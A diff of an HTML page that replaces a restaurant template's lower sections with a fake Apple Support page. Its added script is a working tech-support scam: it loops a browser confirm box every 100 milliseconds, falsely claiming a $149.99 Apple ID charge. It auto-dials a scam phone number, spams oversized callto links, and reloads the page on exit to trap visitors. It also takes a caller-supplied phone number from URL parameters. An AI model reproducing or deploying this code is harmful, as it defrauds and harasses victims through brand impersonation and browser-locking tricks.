-                        <p class="fs-4 fw-normal text-light mb-4"><i
-                                class="fa fa-quote-left text-primary me-3"></i>Dolores sed duo clita tempor justo dolor
-                            et stet lorem kasd labore dolore lorem ipsum. At lorem lorem magna ut et, nonumy et labore
-                            et tempor diam tempor erat dolor rebum sit ipsum.</p>
-                        <div class="d-flex align-items-center">
-                            <img class="img-fluid rounded-circle" src="img/testimonial-1.jpg" alt="">
-                            <div class="ps-4">
-                                <h5 class="text-secondary">Client Name</h5>
-                                <span class="small text-uppercase text-secondary"
-                                    style="letter-spacing: 3px;">Profession</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="testimonial-item">
-                        <p class="fs-4 fw-normal text-light mb-4"><i
-                                class="fa fa-quote-left text-primary me-3"></i>Dolores sed duo clita tempor justo dolor
-                            et stet lorem kasd labore dolore lorem ipsum. At lorem lorem magna ut et, nonumy et labore
-                            et tempor diam tempor erat dolor rebum sit ipsum.</p>
-                        <div class="d-flex align-items-center">
-                            <img class="img-fluid rounded-circle" src="img/testimonial-2.jpg" alt="">
-                            <div class="ps-4">
-                                <h5 class="text-secondary">Client Name</h5>
-                                <span class="small text-uppercase text-secondary"
-                                    style="letter-spacing: 3px;">Profession</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Testimonial End -->
-
-
-    <!-- Blog Start -->
-    <div class="container-fluid p-5">
-        <div class="mb-5 text-center wow fadeIn" data-wow-delay="0.1s" style="max-width: 700px; margin: auto;">
-            <h5 class="section-title">Our Blog</h5>
-            <h1 class="display-3 mb-0">Latest Articles From Food Blog</h1>
-        </div>
-        <div class="row g-5">
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.1s">
-                <div class="blog-item">
-                    <div class="position-relative overflow-hidden rounded-top">
-                        <img class="img-fluid" src="img/menu-3.jpg" alt="">
-                    </div>
-                    <div class="bg-dark d-flex align-items-center rounded-bottom p-4">
-                        <div class="flex-shrink-0 text-center text-secondary border-end border-secondary pe-3 me-3">
-                            <span>01</span>
-                            <h6 class="text-primary text-uppercase mb-0">January</h6>
-                            <span>2045</span>
-                        </div>
-                        <a class="h5 lh-base text-light" href="">Sed amet tempor amet sit kasd sea lorem</h4></a>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.3s">
-                <div class="blog-item">
-                    <div class="position-relative overflow-hidden rounded-top">
-                        <img class="img-fluid" src="img/menu-5.jpg" alt="">
-                    </div>
-                    <div class="bg-dark d-flex align-items-center rounded-bottom p-4">
-                        <div class="flex-shrink-0 text-center text-secondary border-end border-secondary pe-3 me-3">
-                            <span>01</span>
-                            <h6 class="text-primary text-uppercase mb-0">January</h6>
-                            <span>2045</span>
-                        </div>
-                        <a class="h5 lh-base text-light" href="">Sed amet tempor amet sit kasd sea lorem</h4></a>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.5s">
-                <div class="blog-item">
-                    <div class="position-relative overflow-hidden rounded-top">
-                        <img class="img-fluid" src="img/menu-7.jpg" alt="">
-                    </div>
-                    <div class="bg-dark d-flex align-items-center rounded-bottom p-4">
-                        <div class="flex-shrink-0 text-center text-secondary border-end border-secondary pe-3 me-3">
-                            <span>01</span>
-                            <h6 class="text-primary text-uppercase mb-0">January</h6>
-                            <span>2045</span>
-                        </div>
-                        <a class="h5 lh-base text-light" href="">Sed amet tempor amet sit kasd sea lorem</h4></a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Blog End -->
-
-
-    <!-- Instagram Start -->
-    <div class="container-fluid position-relative instagram p-0 mt-5">
-        <a href="" class="d-flex align-items-center justify-content-center position-absolute top-50 start-50 translate-middle bg-white rounded-circle" style="width: 100px; height: 100px; z-index: 1;">
-            <i class="fab fa-instagram fa-2x text-secondary"></i>
-        </a>
-        <div class="row g-0">
-            <div class="col-lg-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.1s">
-                <img class="img-fluid" src="img/menu-2.jpg" alt="">
-            </div>
-            <div class="col-lg-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.2s">
-                <img class="img-fluid" src="img/menu-3.jpg" alt="">
-            </div>
-            <div class="col-lg-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.3s">
-                <img class="img-fluid" src="img/menu-4.jpg" alt="">
-            </div>
-            <div class="col-lg-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.4s">
-                <img class="img-fluid" src="img/menu-5.jpg" alt="">
-            </div>
-            <div class="col-lg-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.5s">
-                <img class="img-fluid" src="img/menu-6.jpg" alt="">
-            </div>
-            <div class="col-lg-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.6s">
-                <img class="img-fluid" src="img/menu-7.jpg" alt="">
-            </div>
-        </div>
-    </div>
-    <!-- Instagram End -->
-
-
-    <!-- Footer Start -->
-    <div class="container-fluid bg-dark text-secondary px-5">
-        <div class="row gx-5 wow fadeIn" data-wow-delay="0.1s">
-            <div class="col-lg-8 col-md-6">
-                <div class="row gx-5">
-                    <div class="col-lg-4 col-md-12 pt-5 mb-5">
-                        <h3 class="text-light mb-4">Get In Touch</h3>
-                        <div class="d-flex mb-2">
-                            <i class="bi bi-geo-alt text-primary me-2"></i>
-                            <p class="mb-0">123 Street, New York, USA</p>
-                        </div>
-                        <div class="d-flex mb-2">
-                            <i class="bi bi-envelope-open text-primary me-2"></i>
-                            <p class="mb-0">info@example.com</p>
-                        </div>
-                        <div class="d-flex mb-2">
-                            <i class="bi bi-telephone text-primary me-2"></i>
-                            <p class="mb-0">+012 345 67890</p>
-                        </div>
-                        <div class="d-flex mt-4">
-                            <a class="btn btn-primary btn-square rounded-circle me-2" href="#"><i
-                                    class="fab fa-twitter"></i></a>
-                            <a class="btn btn-primary btn-square rounded-circle me-2" href="#"><i
-                                    class="fab fa-facebook-f"></i></a>
-                            <a class="btn btn-primary btn-square rounded-circle me-2" href="#"><i
-                                    class="fab fa-linkedin-in"></i></a>
-                            <a class="btn btn-primary btn-square rounded-circle" href="#"><i
-                                    class="fab fa-instagram"></i></a>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-12 pt-0 pt-lg-5 mb-5">
-                        <h3 class="text-light mb-4">Quick Links</h3>
-                        <div class="d-flex flex-column justify-content-start">
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Home</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>About Us</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Food Menu</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Our Chefs</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Latest Blog</a>
-                            <a class="text-secondary" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Contact Us</a>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-12 pt-0 pt-lg-5 mb-5">
-                        <h3 class="text-light mb-4">More Links</h3>
-                        <div class="d-flex flex-column justify-content-start">
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Home</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>About Us</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Food Menu</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Our Chefs</a>
-                            <a class="text-secondary mb-2" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Latest Blog</a>
-                            <a class="text-secondary" href="#"><i
-                                    class="bi bi-arrow-right text-primary me-2"></i>Contact Us</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6">
-                <div class="d-flex flex-column align-items-center justify-content-center text-center h-100 p-5"
-                    style="background: #111111;">
-                    <h3 class="text-white mb-4">Newsletter</h3>
-                    <h6 class="text-uppercase text-light mb-2">Subscribe Our Newsletter</h6>
-                    <p class="small text-secondary">Amet justo diam dolor rebum lorem sit stet sea justo kasd</p>
-                    <form action="">
-                        <div class="input-group">
-                            <input type="text" class="form-control border-white p-3" placeholder="Your Email">
-                            <button class="btn btn-primary">Sign Up</button>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
                         </div>
                     </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
                 </div>
-            </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-855-657-8360 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-    <div class="container-fluid py-4 py-lg-0 px-5" style="background: #111111;">
-        <div class="row gx-5">
-            <div class="col-lg-8">
-                <div class="py-lg-4 text-center">
-                    <p class="text-secondary mb-0">&copy; <a class="text-light fw-bold" href="#">Your Site Name</a>. All
-                        Rights Reserved. Distributed by <a class="text-light fw-bold"
-                            href="https://themewagon.com">ThemeWagon</a></p>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-            </div>
-            <div class="col-lg-4">
-                <div class="py-lg-4 text-center credit">
-                    <!--/*** This template is free as long as you keep the below author’s credit link/attribution link/backlink. ***/-->
-                    <!--/*** If you'd like to use the template without the below author’s credit link/attribution link/backlink, ***/-->
-                    <!--/*** you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal". ***/-->
-                    <p class="text-light mb-0">Designed by <a class="text-light fw-bold" target="_blank"
-                            href="https://htmlcodex.com">HTML Codex</a></p>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
                 </div>
-            </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-855-657-8360
+			 " property="telephone">
+            </section>
         </div>
-    </div>
-    <!-- Footer End -->
+    </footer>
 
 
-    <!-- Back to Top -->
-    <a href="#" class="btn btn-dark py-3 fs-4 back-to-top"><i class="bi bi-arrow-up"></i></a>
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
 
-    <!-- JavaScript Libraries -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="lib/wow/wow.min.js"></script>
-    <script src="lib/easing/easing.min.js"></script>
-    <script src="lib/waypoints/waypoints.min.js"></script>
-    <script src="lib/counterup/counterup.min.js"></script>
-    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-    <!-- Template Javascript -->
-    <script src="js/main.js"></script>
-</body>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-</html>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-855-657-8360');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-657-8360"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-855-657-8360 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
